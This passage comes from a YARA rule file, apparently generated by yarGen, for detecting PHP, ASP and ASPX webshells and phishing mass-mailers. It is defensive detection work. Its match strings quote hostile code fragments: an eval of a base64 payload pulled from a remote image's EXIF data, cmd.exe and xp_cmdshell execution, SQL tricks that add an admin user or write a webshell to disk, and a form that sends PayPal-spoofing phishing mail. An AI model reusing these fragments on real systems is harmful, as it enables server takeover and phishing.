      $s5 = "VaDCx2/zYemiCr7vDNgYn1fl1nloghICYYcQmkM+M+x/hMVg9siQuUjd/KlcLBlVhPLXiTa6SzSqRDTaNlWpNaLetSvFnApkDonjrQ8ne7w0Lja5OaB/ROr+VK/IEOCt" ascii
      $s6 = "/48Vy33gsHFTJKYhWfdYJdv3awQ8F29VT4NkWU620Z6uOmBe+//YkhravkwRnKtlfeoi14Y5CH3sgET903v4iHkFZ+kr9HBgdKrUB1xtXeBgBKyNFZSLrsSy89fY70TZ" ascii
      $s7 = "F4FJochIOYCqNilCmgF5DEhga8NNce6uc9vdt4U2yO4Sw+Sz7IJTbGCl7KJCGAYawCRO/GhpdLlOfUKssA05OldPyQzd817+ryTOy+72uvDwOiDWaUF4UmHTOkydpGFC" ascii
      $s8 = "PE43fJsdC4tuCJROlx/Fasg1oQJatsX3Fx8C8KSe9Bm1vfyNiUfnHbVsmS42Yf07vK4xUElQbcTHqcLAnxrhIwkcHt7tzJzmeaoA9/zK2ifXbSinemrnGYKD65hpTI5g" ascii
      $s9 = "7hC9uLBIngmA3vp72use6LeWv+7MaZMxwzs1UnuG1PTTV7N30SyG3z2yDM7Xi9rLFWmuf5hynVaC1gknKA6XmwqJRqs2z4UErkq6J1RKP5e25OQLqLL0W41edB1bBllt" ascii
      $s10 = "qL/bR2X5TvT6G1K7p3vnRMBS5UInJbl1l3ZpLkPEcVgrNFy55lngG2rH5gUwdLiuMzVyq2fi3Y/wm9vQyHlKEyclAIXnHLunOih2PoDoY9Xvsh9Nq34yZr+xStwgDP1h" ascii
      $s11 = "5C9PM58Zch+TKDiHGNCCT3QRp99YEUzk5RSaHcQw040PGWpPEu3NLRiYjtV7TxdcvC5ympFn4ssXuqNQN4arfGaa+pFmkAHwni/OXt+Y7Nkal5cmdhluq3zZqmxL6FrY" ascii
      $s12 = "/3WeLNID6MvGj7BxeEh0OCH4QAPNMiKJ5aPMu80aCOmrribqBEVU/1DuL8/iO9rQSXxqAjU/3qewDkuMerDy8Xrs8RYSyRq+C00paliEZAHQc1ouz0SXHirfXdb1GcMy" ascii
      $s13 = "8qz75rqIgI96/3slzVszuKZh9BE0comotzrIrYfPArrjnKNNGK5fIHy+MAi0ogc43tEHj3TjyWZQOR8ZOddPDKoWL4h4+2e7+wjG9PjyZUk05s8UCGaFNxWhs3Ht8CZo" ascii
      $s14 = "9eYtekhZ9OYCE1kBOATzzYwADfa2F1j4IThnHSBfkg5UJN1GH3QPMTD9LRJLkOQN/2w6BJokDdLu+rSgRSPqdSuK1yUUPJeAA9OQbF5spc7JEQLj1lG9Q1s4E+MrPmsA" ascii
      $s15 = "g8nFW4Tfw26WRZk5BGAGrXelw5A4OWXJijq05iBUbyf5UON7uZg+qzrRMR2Nqk6PZ9eCECUdtfk39CVjE5zzJlRtOMbIksX++cQhW7ZuXCjuHmfhjStNQPaWrtsDOetJ" ascii
      $s16 = "OVyI6siBHDXDZDoSUbDJq9PCMeqlUPZN1zlV+vQINMJ0lvt0wLWPk/QAPVv3PTHg49/ld9BWF4TbHHhZWQiCH87c2K5fWjtZv3Wa1EHHDUsEhnn7QVSyZfuaHGLnZhIu" ascii
      $s17 = "S2FOYXDv1Vg4DNa4CQKp0x+iRFGMWNH9tiGaxX5REUytIm7JZK+fCXjIckT7z688B2H4OfMxdXjWlNATSLUY0MpuLA4OBZRLOuQZIuhAB2X0GWGvXNSzq8LlcWPyYsNA" ascii
      $s18 = "6JN3c/dW0PTh/IHOIlHt5ZRKe4FIMTuJaclGXiCmgYvVRlgn05CsXjjp3MfLFk8IDZcvHtzVNkLDcv6Y6v1KTgWAMHiroTROSzInUstmK44gb1WVoc7ilY7e7fnWvKyP" ascii
      $s19 = "9BEs205xfExC+d2JPaWbWCvuYVJSM/bRZHF4luRsGOXj4dZ8pDheWEaYAyQY1XLZBOD49Nr8ljMCrkA/IuKQASVxggy/hA/6kVzDBd3JvkAxAuAPRZEkuKKywrMAeGGJ" ascii
      $s20 = "aHu0GZzt4sPNIBVgNSQ4OEGMBcIymbw0r2pa5AwvgkKpKjsuCL2RepJ3YFH6IJEAHqSo8NX7OjkG9n5E2IxsfpCBSzC9sX08iL7G+fXKs8oNfjz/8grhHXAw7+qg/DGm" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_mailer {
   meta:
      description = "webshell - file mailer.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "906d3ec732ce971e6c755792449073b8eea15fae86c21324634a733149ee46d4"
   strings:
      $s1 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s2 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s3 = "<label>Your Email : </label> <input type=\"text\" size=\"20\" name=\"email\" value=\"service@paypal.com\"placeholder=\" - \" req" ascii
      $s4 = "<label>Your Email : </label> <input type=\"text\" size=\"20\" name=\"email\" value=\"service@paypal.com\"placeholder=\" - \" req" ascii
      $s5 = "<script type=\"text/javascript\" src=\"//code.jquery.com/jquery-1.8.3.js\"></script>" fullword ascii
      $s6 = "  src: local('Nova Flat'), local('NovaFlat'), url(http://fonts.gstatic.com/s/novaflat/v8/vFeor41nvsomiEVSx6n4iltXRa8TVwTICgirnJh" ascii
      $s7 = "  src: local('Nova Flat'), local('NovaFlat'), url(http://fonts.gstatic.com/s/novaflat/v8/vFeor41nvsomiEVSx6n4iltXRa8TVwTICgirnJh" ascii
      $s8 = "<label>Subject  : </label> <input type=\"text\" size=\"20\" name=\"subject\" value=\"Notice: Your account has been limited and y" ascii
      $s9 = "<label>Your Name : </label> <input type=\"text\" size=\"20\" name=\"namemail\" value=\"Paypal Service\" placeholder=\" - \" requ" ascii
      $s10 = " update account\" placeholder=\" - \" required>&nbsp;" fullword ascii
      $s11 = "<label>Your Name : </label> <input type=\"text\" size=\"20\" name=\"namemail\" value=\"Paypal Service\" placeholder=\" - \" requ" ascii
      $s12 = "$headers = 'Content-type: text/html; charset=iso-8859-1' . \"\\r\\n\";" fullword ascii
      $s13 = "<textarea name=\"email_list\" id=\"email_list\" onKeyDown=\"countFakes()\" onChange=\"countFakes()\" style=\"margin: 0px; height" ascii
      $s14 = "eval(base64_decode($BASED[\"COMPUTED\"][\"UserComment\"]));" fullword ascii
      $s15 = "document.getElementById(\"count\").innerHTML =" fullword ascii
      $s16 = "document.getElementById(\"email_list\").value.split(\"\\n\").length;" fullword ascii
      $s17 = "$headers = 'MIME-Version: 1.0' . \"\\r\\n\";" fullword ascii
      $s18 = "<textarea name=\"email_list\" id=\"email_list\" onKeyDown=\"countFakes()\" onChange=\"countFakes()\" style=\"margin: 0px; height" ascii
      $s19 = "- <label>Email List : </label> <font id=\"count\" style=\"font-weight: bold;\">0</font> - " fullword ascii
      $s20 = "<form action=\"\" method=\"POST\">" fullword ascii
   condition:
      uint16(0) == 0x0a0a and filesize < 20KB and
      8 of them
}

rule phpiisspy {
   meta:
      description = "webshell - file phpiisspy.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1f144bba0092c5ea9402f8b72970aeca8cbd8bb71ef1d849939299372fdfb6e5"
   strings:
      $s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />" fullword ascii
      $s2 = ".tab-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px; PADDING-LEFT: 5px; PADDING-BOTTOM: " ascii
      $s3 = "<html xmlns=http://www.w3.org/1999/xhtml>" fullword ascii
      $s4 = "<head id=Head1>" fullword ascii
      $s5 = "<title>IIS SPY</title>" fullword ascii
      $s6 = ".Soft-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px solid; PADDING-LEFT: 5px; PADDING-B" ascii
      $s7 = "                $webSite=new com(\"IIS://localhost/w3svc/\".$obj3w->Name.'/Root');" fullword ascii
      $s8 = "<meta http-equiv=\"pragma\" content=\"no-cache\" />" fullword ascii
      $s9 = ".tab-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px; PADDING-LEFT: 5px; PADDING-BOTTOM: " ascii
      $s10 = "<table cellspacing=1 runat=server cellpadding=1 width=600px align=center border=0>" fullword ascii
      $s11 = "if(IS_WIN && IS_COM){" fullword ascii
      $s12 = "        $obj=@new COM(\"IIS://localhost/w3svc\");" fullword ascii
      $s13 = "                $ctn.=\"<td >\".$i.\"</td><td >\".$user.\"</td><td >\".$pass.\"</td><td >\".$Binds.\"</td><td >\".$path.\"</td><" ascii
      $s14 = "<tr><td class=Soft-content>" fullword ascii
      $s15 = ".Soft-content { BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px solid; PADDING-LEFT: 5px; PADDING-B" ascii
      $s16 = "define('IS_WIN', DIRECTORY_SEPARATOR == '\\\\');" fullword ascii
      $s17 = "#ffffff;}" fullword ascii
      $s18 = "BODY,TD{FONT-SIZE: 14px;line-height:20px;}" fullword ascii
      $s19 = "                ShowErr($e->getMessage());" fullword ascii
      $s20 = "function ShowErr($s){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule webshell_asp_xx {
   meta:
      description = "webshell - file xx.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dad2fbae4c177135c75e0f08cfcfd7211591d4d081df4a1ab04202a770786cbb"
   strings:
      $x1 = "body,ul,li{margin:0;padding:0;font-family:Tahoma;}a{color:#0265FF;text-decoration:none}a:hover{color:#003B99}li{display:block}.c" ascii
      $s2 = "<a href=\"mailto:support@persiangig.com\" style=\"font-family:tahoma;font-size:10px;float:left;margin-left:50px;direction:rtl\">" ascii
      $s3 = "<a href=\"mailto:support@persiangig.com\" style=\"font-family:tahoma;font-size:10px;float:left;margin-left:50px;direction:rtl\">" ascii
      $s4 = "px}#ads{float:right;width:130px}#footer{clear:both;height:90px;margin-top:-90px;position:relative}body:before{content:\"\";float" ascii
      $s5 = "ort@Persiangig.com</a>" fullword ascii
      $s6 = "<meta content=\"fa\" http-equiv=\"Content-Language\">" fullword ascii
      $s7 = "<meta http-equiv=\"refresh\" content=\"30\">" fullword ascii
      $s8 = " - Persiangig</title>" fullword ascii
      $s9 = "er{background:white}#tab-report{height:22px;width:70px}.tab-report-on,#tab-report:hover{background:white}#tab-about{height:22px;" ascii
      $s10 = ";position:relative;width:860px}#logo{color:white;cursor:pointer;height:190px;left:650px;position:absolute;top:-14px;width:240px}" ascii
      $s11 = "eft;height:100%;margin-top:-32767px;width:0}#header{background:#145491;height:150px;position:relative}#header-wrap{margin:0 auto" ascii
      $s12 = "rsor:pointer;float:left;margin-right:2px}#tab-home{height:22px;width:36px}.tab-home-on,#tab-home:hover{background:white}#tab-new" ascii
      $s13 = "#tabs{left:130px;position:absolute;top:128px}.tab{background:#8AAAC8;font-size:12px;color:#0B447A;border-radius:12px 12px 0 0;cu" ascii
      $s14 = "width:70px}.tab-about-on,#tab-about:hover{background:white}#tab-contact{height:22px;width:70px}.tab-contact-on,#tab-contact:hove" ascii
      $s15 = "s{height:22px;width:70px}.tab-news-on,#tab-news:hover{background:white;}#tab-ads{height:22px;width:70px}.tab-ads-on,#tab-ads:hov" ascii
      $s16 = "r{background:white}#sign-in{background:url(/img90325/sign-in.gif) no-repeat;padding:45px 3px 3px;width:205px}.ie-fix{height:20px" ascii
      $s17 = "body,ul,li{margin:0;padding:0;font-family:Tahoma;}a{color:#0265FF;text-decoration:none}a:hover{color:#003B99}li{display:block}.c" ascii
      $s18 = ". 2011&copy;</div>" fullword ascii
      $s19 = "                <div id=\"header-wrap\">" fullword ascii
      $s20 = "-left:10px;font-family:Arial;font-size:50px;float:left;border:4px solid white;border-radius:10px;padding:5px 10px 15px 10px;}h2{" ascii
   condition:
      uint16(0) == 0x683c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule promailerv2 {
   meta:
      description = "webshell - file promailerv2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c521efe5bef0eac05f1728b0cc74586f96c814b02495a4e6a16217cdec11cfd8"
   strings:
      $s1 = "$mail->SmtpClose();echo \"<p><b>--------------- SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON --------------- </b>" ascii
      $s2 = "$mail->SmtpClose();echo \"<p><b>--------------- SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON --------------- </b>" ascii
      $s3 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s4 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s5 = "<script src='https://sites.google.com/site/jquery1000/jquery-1.6.1.js'></script>" fullword ascii
      $s6 = "QjhGNDZDQUJCQjBFMjExOTgxQUQwNURCN0VFQjJFOSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo5QTk0QzcyNEI3MUQxMUUyODAwNkRGMjRGRkJEN0I5RCIgeG1w" ascii /* base64 encoded string 'B8F46CABBB0E211981AD05DB7EEB2E9" xmpMM:DocumentID="xmp.did:9A94C724B71D11E28006DF24FFBD7B9D" xmp' */
      $s7 = "cG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAg" ascii /* base64 encoded string 'pmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.3-c011 66.145661, 2012/02/06-14:56:27  ' */
      $s8 = "TU06SW5zdGFuY2VJRD0ieG1wLmlpZDo5QTk0QzcyM0I3MUQxMUUyODAwNkRGMjRGRkJEN0I5RCIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChX" ascii /* base64 encoded string 'MM:InstanceID="xmp.iid:9A94C723B71D11E28006DF24FFBD7B9D" xmp:CreatorTool="Adobe Photoshop CS6 (W' */
      $s9 = "YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAv" ascii /* base64 encoded string 'about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stRef="http://ns.adobe.com/xap/1.0/' */
      $s10 = "b2N1bWVudElEPSJ4bXAuZGlkOjhCOEY0NkNBQkJCMEUyMTE5ODFBRDA1REI3RUVCMkU5Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRh" ascii /* base64 encoded string 'ocumentID="xmp.did:8B8F46CABBB0E211981AD05DB7EEB2E9"/> </rdf:Description> </rdf:RDF> </x:xmpmeta' */
      $s11 = "aW5kb3dzKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkM4MDIyM0M4MDRCN0UyMTE4OUY1RTZFNUYxNkU4NTJCIiBzdFJlZjpk" ascii /* base64 encoded string 'indows)"> <xmpMM:DerivedFrom stRef:instanceID="xmp.iid:C80223C804B7E21189F5E6E5F16E852B" stRef:d' */
      $s12 = "c1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo4" ascii /* base64 encoded string 'sType/ResourceRef#" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmpMM:OriginalDocumentID="xmp.did:8' */
      $s13 = "    // Send encoded password" fullword ascii
      $s14 = "   * (e.g. \"smtp1.example.com:25;smtp2.example.com\")." fullword ascii
      $s15 = "   * Strips newlines to prevent header injection." fullword ascii
      $s16 = "  if(isset($_POST['action']) && $numemails !=0 ){echo \"<script>alert('Mail sending complete\\\\r\\\\n$numemails mail(s) was " fullword ascii
      $s17 = "3420203d2072616e6428312c3939393939293b" ascii /* hex encoded string '4  = rand(1,99999);' */
      $s18 = "676c6f62616c2024656d61696c6c6973743b" ascii /* hex encoded string 'global $emaillist;' */
      $s19 = "676c6f62616c20246d65" ascii /* hex encoded string 'global $me' */
      $s20 = "202466726f6d293b" ascii /* hex encoded string ' $from);' */
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule webshell_asp_zehir4 {
   meta:
      description = "webshell - file zehir4.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
   strings:
      $s1 = "response.Write \"<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>\"" fullword ascii
      $s2 = "                                          frames.byZehir.document.execCommand(command, false, option);" fullword ascii
      $s3 = "                                            frames.byZehir.document.execCommand('InsertImage', false, imagePath);" fullword ascii
      $s4 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
      $s5 = "    objConn.Execute strSQL" fullword ascii
      $s6 = "CASE 9 'SQL Execute" fullword ascii
      $s7 = " olabilir')</script>\":Response.End" fullword ascii
      $s8 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=\"&time&\"'>!</a></font> - <a href='\"&dosyapath" ascii
      $s9 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time=\"&time&\"'>!</a></font> - <a href='\"&dosyapath" ascii
      $s10 = "    targetPath=objUpload.Fields(\"folder\").Value" fullword ascii
      $s11 = "<form name=frmUpload method=post enctype=\"multipart/form-data\" action=\"<%=DosyaPath&\"?status=-4&Time=\"&time&\"&Path=\"&path" ascii
      $s12 = "<form name=frmUpload method=post enctype=\"multipart/form-data\" action=\"<%=DosyaPath&\"?status=-4&Time=\"&time&\"&Path=\"&path" ascii
      $s13 = "Function ReadBinaryFile(FileName)" fullword ascii
      $s14 = "  ReadBinaryFile = BinaryStream.Read" fullword ascii
      $s15 = "Response.End%>" fullword ascii
      $s16 = "%><script language=javascript>" fullword ascii
      $s17 = "sterseniz Download Ederek g" fullword ascii
      $s18 = "tu : [\"&err.Description&\"]</td></tr>\"" fullword ascii
      $s19 = "ument.body.innerHTML; alert(document.all['byMesaj'].value);\">" fullword ascii
      $s20 = "Set objFSO = CreateObject (\"Scripting.FileSystemObject\")" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      8 of them
}

rule webshell_aspx_spexec {
   meta:
      description = "webshell - file spexec.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b0a31a7937be01fb4fe8705344b32bc0a7b3733639c615a3b400d3fc1bd1d7e3"
   strings:
      $s1 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
      $s2 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.DateTime).Value = ((Text" ascii
      $s3 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.DateTime).Value = ((Text" ascii
      $s4 = "<%@ Import namespace=\"System.Data\"%>" fullword ascii
      $s5 = "<%@ Import namespace=\"System.Data.SqlClient\"%>" fullword ascii
      $s6 = "    protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
      $s7 = "    <title>Stored Procedure Execute</title>" fullword ascii
      $s8 = "                            <asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"><" ascii
      $s9 = "            sqlCommand.CommandType = CommandType.StoredProcedure;" fullword ascii
      $s10 = "                            <asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"><" ascii
      $s11 = "                                             \";Password=\" + txtPassword.Text +" fullword ascii
      $s12 = "                    <asp:TemplateColumn HeaderText=\"Input Value\">" fullword ascii
      $s13 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NChar).Value = ((TextBox" ascii
      $s14 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Char, int.Parse(((TableC" ascii
      $s15 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NVarChar, int.Parse(((Ta" ascii
      $s16 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Bit).Value = ((TextBox)d" ascii
      $s17 = "            sqlCommand.Parameters.Add(\"@procedure_name\", SqlDbType.NVarChar, 390).Value = cboSps.SelectedItem.Value;" fullword ascii
      $s18 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NChar).Value = ((TextBox" ascii
      $s19 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NVarChar, int.Parse(((Ta" ascii
      $s20 = "                        sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.TinyInt).Value = uint.Pa" ascii
   condition:
      uint16(0) == 0x253c and filesize < 40KB and
      8 of them
}

rule webshell_php_PH_Vayv {
   meta:
      description = "webshell - file PH Vayv.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c9b4a962ecc4545922cf9055fbed2b85d91ff8b7f29db40fbf903bef69f8836"
   strings:
      $s1 = "        <a style=\"text-decoration: none\" target=\"_self\" href=\"<?echo \"$fistik\";?>.php?duzenle=<?echo \"$ekinci\";?>&dizin" ascii
      $s2 = "        <a color=\"#9F9F9F\" target=\"_blank\" href=\"<?echo \"$fistik.php?sistembilgisi=1\";?>\" style=\"text-decoration: none" ascii
      $s3 = "        <a color=\"#9F9F9F\" target=\"_blank\" href=\"<?echo \"$fistik.php?sistembilgisi=1\";?>\" style=\"text-decoration: none" ascii
      $s4 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s5 = "        <a style=\"text-decoration: none\" target=\"_self\" href=\"<?echo \"$fistik\";?>.php?duzenle=<?echo \"$ekinci\";?>&dizin" ascii
      $s6 = "    <img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s7 = "<meta name=\"ProgId\" content=\"FrontPage.Editor.Document\">" fullword ascii
      $s8 = "$okunan=fgets($baglan,1024);" fullword ascii
      $s9 = "<meta name=\"GENERATOR\" content=\"Microsoft FrontPage 5.0\">" fullword ascii
      $s10 = "while (($ekinci=readdir ($sedat))){" fullword ascii
      $s11 = "    <form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s12 = "closedir($sedat);" fullword ascii
      $s13 = "    <form method=\"POST\" action=\"<?echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s14 = "open@aventgrup.net\" style=\"text-decoration: none\"><font color=\"#858585\">@AventGrup.Net</font></a></font><font face=\"Verdan" ascii
      $s15 = "    <form method=\"POST\" action=\"<?echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s16 = "    <img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s17 = "    <a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s18 = "    <img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s19 = "name=\"duzenx1\" value=\"Kaydet\"" fullword ascii
      $s20 = "d=\"AutoNumber26\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule webshell_aspx_cmdexec {
   meta:
      description = "webshell - file cmdexec.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2e8c7eacd739ca3f3dc4112b41a024157035096b8d0c26ba79d8b893136391bc"
   strings:
      $s1 = "            processStartInfo.FileName = \"cmd.exe\";" fullword ascii
      $s2 = "        Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));" fullword ascii
      $s3 = "            processStartInfo.Arguments = \"/c \" + command;" fullword ascii
      $s4 = "    private string ExecuteCommand(string command)" fullword ascii
      $s5 = "            processStartInfo.UseShellExecute = false;" fullword ascii
      $s6 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
      $s7 = "input,form select {\\n font-family: \\\"Lucida Console\\\", monospace;\\n font-size: 88%;\\n}\\n-->\\n</style></head>\\n<body>" ascii
      $s8 = "    private const string HEADER = \"<html>\\n<head>\\n<title>command</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,table,p," ascii
      $s9 = "    protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
      $s10 = "                <td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td>" fullword ascii
      $s11 = "<head id=\"Head1\" runat=\"server\">" fullword ascii
      $s12 = "            using (StreamReader streamReader = process.StandardOutput)" fullword ascii
      $s13 = "            Process process = Process.Start(processStartInfo);" fullword ascii
      $s14 = "    <form id=\"formCommand\" runat=\"server\">" fullword ascii
      $s15 = "if (txtAuthKey.Text != AUTHKEY)" fullword ascii
      $s16 = "            processStartInfo.RedirectStandardOutput = true;" fullword ascii
      $s17 = "<%@ Import namespace=\"System.Diagnostics\"%>" fullword ascii
      $s18 = "            ProcessStartInfo processStartInfo = new ProcessStartInfo();" fullword ascii
      $s19 = "                <td><asp:TextBox ID=\"txtCommand\" runat=\"server\" Width=\"820px\"></asp:TextBox></td>" fullword ascii
      $s20 = "    private const string AUTHKEY = \"woanware\";" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 8KB and
      8 of them
}

rule AspxSpy2014Final {
   meta:
      description = "webshell - file AspxSpy2014Final.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
   strings:
      $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
      $x2 = "OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:" ascii
      $x3 = "ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create tabl" ascii
      $x4 = "<asp:LinkButton ID=\"Bin_Button_Logout\" runat=\"server\" OnClick=\"Bin_Button_Logout_Click\" Text=\"Logout\" ></asp:LinkButton>" ascii
      $x5 = "            Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_T" ascii
      $x6 = "ePath.Value + \"\\\" -T -f c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
      $x7 = "<td style=\"width:20%\" align=\"left\">Target : <input id=\"Bin_TextBox_Target\" class=\"input\" runat=\"server\" type=\"text\" " ascii
      $x8 = "stItem Value=\"sp_makewebtask @outputfile='c:\\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''" ascii
      $x9 = "Create','odsole70.dll')\">Add sp_oacreate</asp:ListItem><asp:ListItem Value=\"Exec sp_configure 'show advanced options',1;RECONF" ascii
      $x10 = "\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
      $x11 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright(C)2006-2014 <a hre" ascii
      $s12 = "<p>ConnString : <asp:TextBox id=\"Bin_TextBox_ConnStr\" style=\"width:70%;margin:0 8px; height:17px\" CssClass=\"input\" runat=" ascii
      $s13 = " <input class=\"input\" runat=\"server\" id=\"Bin_TextBox_CmdPath\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cm" ascii
      $s14 = "ndedproc('xp_cmdshell','xplog70.dll')\">Add xp_cmdshell</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('sp_" ascii
      $s15 = "Bin_H2_Title.InnerText=\"Execute Command >>\";" fullword ascii
      $s16 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WebShell Ver: <%=Version%></a></span><" ascii
